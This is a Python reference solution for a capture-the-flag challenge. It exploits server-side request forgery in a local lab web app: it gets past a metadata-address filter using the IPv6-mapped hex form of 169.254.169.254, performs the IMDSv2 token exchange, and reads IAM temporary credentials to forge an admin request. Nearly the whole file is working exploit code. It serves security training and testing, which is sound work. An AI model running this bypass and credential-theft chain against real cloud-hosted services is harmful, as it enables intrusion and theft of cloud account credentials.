#!/usr/bin/env python3
"""
Reference solver for web-metaguard (insane tier, v3.2).

Chain:
  1. Log in as guest:guest.
  2. Prove that the obvious IMDS encodings (dotted, decimal, hex, hostname
     substrings that mention 169.254/metadata/aws) are all blocked.
  3. Reach IMDS via IPv6-mapped IPv4 in *hex* form — [::ffff:a9fe:a9fe] — so
     no cheat-sheet substring appears in the hostname the SSRF filter sees.
  4. Do the two-step IMDSv2 dance through the fetcher:
       a) PUT /latest/api/token  (X-aws-ec2-metadata-token-ttl-seconds: 21600)
       b) GET /latest/meta-data/iam/security-credentials/... with
          X-aws-ec2-metadata-token: <token>
  5. Derive HMAC-SHA256(SecretAccessKey, "metaguard-admin-v1") and call
     /api/admin/flag with an AWS4 authorization header.

Usage:
    python3 solution/solve.py [base_url]
    (default base_url: http://127.0.0.1:8081)

If no server is reachable it will spawn challenge/app.py on a scratch port.
"""
import os
import re
import sys
import json
import time
import hmac
import hashlib
import subprocess
import urllib.request
import urllib.parse

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8081")

# Hostname the SSRF filter must NOT be able to classify as link-local.
# 169.254.169.254 -> 0xa9fe.0xa9fe in v6-mapped-hex form; no forbidden
# substring appears in the literal.
IPV6_MAPPED_IMDS = "[::ffff:a9fe:a9fe]"

# Encodings the hardened filter rejects (used as sanity probes).
DECIMAL_IMDS = str((169 << 24) | (254 << 16) | (169 << 8) | 254)  # 2852039166


class Client:
    def __init__(self, base):
        self.base = base.rstrip("/")
        self.cj = {}

    def _req(self, path, data=None, headers=None):
        url = self.base + path
        h = {"Content-Type": "application/json"}
        if headers:
            h.update(headers)
        if self.cj:
            h["Cookie"] = "; ".join("%s=%s" % kv for kv in self.cj.items())
        body = json.dumps(data).encode() if data is not None else None
        req = urllib.request.Request(url, data=body, headers=h,
                                     method="POST" if data is not None else "GET")
        try:
            resp = urllib.request.urlopen(req, timeout=10)
            raw = resp.read()
            sc = resp.getheader("Set-Cookie")
        except urllib.error.HTTPError as e:
            raw = e.read()
            sc = None
        if sc:
            c = sc.split(";", 1)[0]
            k, v = c.split("=", 1)
            self.cj[k] = v
        try:
            return json.loads(raw)
        except Exception:
            return {"_raw": raw.decode(errors="replace")}

    def login(self, u, p):
        return self._req("/api/login", {"username": u, "password": p})

    def fetch(self, url, method="GET", extra_headers=None):
        params = [("url", url), ("method", method)]
        for k, v in (extra_headers or {}).items():
            params.append(("hdr", "%s:%s" % (k, v)))
        q = urllib.parse.urlencode(params)
        return self._req("/api/fetch?" + q)

    def admin_flag(self, access, sig):
        auth = "AWS4-HMAC-SHA256 Credential=%s, Signature=%s" % (access, sig)
        return self._req("/api/admin/flag", headers={"Authorization": auth})


def wait_up(base, timeout=10):
    for _ in range(int(timeout * 10)):
        try:
            urllib.request.urlopen(base + "/", timeout=1).read()
            return True
        except Exception:
            time.sleep(0.1)
    return False


def main():
    proc = None
    base = BASE
    if not wait_up(base, timeout=1):
        # spawn our own instance on a scratch port
        port = "8199"
        base = "http://127.0.0.1:%s" % port
        here = os.path.dirname(os.path.abspath(__file__))
        app = os.path.join(here, "..", "challenge", "app.py")
        env = dict(os.environ, PORT=port)
        proc = subprocess.Popen([sys.executable, app], env=env,
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if not wait_up(base, timeout=10):
            print("[-] could not start app")
            sys.exit(1)
        print("[*] spawned challenge app on", base)

    try:
        c = Client(base)

        print("[*] logging in as low-priv guest/guest")
        assert c.login("guest", "guest").get("ok"), "login failed"

        # sanity: the obvious encodings are all blocked now
        for probe in ("http://169.254.169.254/latest/meta-data/",
                      "http://%s/latest/meta-data/" % DECIMAL_IMDS,
                      "http://0xA9FEA9FE/latest/meta-data/",
                      "http://metadata.internal/latest/meta-data/",
                      "http://imds.aws.local/latest/"):
            b = c.fetch(probe)
            print("[*] blocked as expected:", probe, "->", b.get("error"))
            assert b.get("error") == "blocked", "filter should block %s" % probe

        # bypass: IPv6-mapped IPv4 in HEX form — no cheat-sheet substring.
        base_url = "http://%s" % IPV6_MAPPED_IMDS
        print("[*] SSRF via IPv6-mapped IPv4 (hex)", IPV6_MAPPED_IMDS)

        # IMDSv2 step 1: PUT to /latest/api/token with the TTL header.
        r = c.fetch(base_url + "/latest/api/token", method="PUT",
                    extra_headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
        imds_token = r["body"].strip()
        assert imds_token and r.get("status") == 200, "IMDSv2 token PUT failed: %r" % r
        print("[+] got IMDSv2 session token:", imds_token[:16] + "...")

        # IMDSv2 step 2: GET the security-credentials index with the token.
        meta_base = base_url + "/latest/meta-data/iam/security-credentials/"
        r = c.fetch(meta_base, method="GET",
                    extra_headers={"X-aws-ec2-metadata-token": imds_token})
        role = r["body"].strip()
        assert role, "role read failed: %r" % r
        print("[+] leaked IAM role:", role)

        r = c.fetch(meta_base + role, method="GET",
                    extra_headers={"X-aws-ec2-metadata-token": imds_token})
        creds = json.loads(r["body"])
        print("[+] leaked temp creds: AccessKeyId=%s" % creds["AccessKeyId"])

        # derive the admin signature from the SecretAccessKey
        sig = hmac.new(creds["SecretAccessKey"].encode(),
                       b"metaguard-admin-v1", hashlib.sha256).hexdigest()

        r = c.admin_flag(creds["AccessKeyId"], sig)
        flag = r.get("flag")
        assert flag and re.match(r"CTF4\{.*\}", flag), "no flag: %r" % r
        print("[+] FLAG:", flag)
    finally:
        if proc:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except Exception:
                proc.kill()


if __name__ == "__main__":
    main()
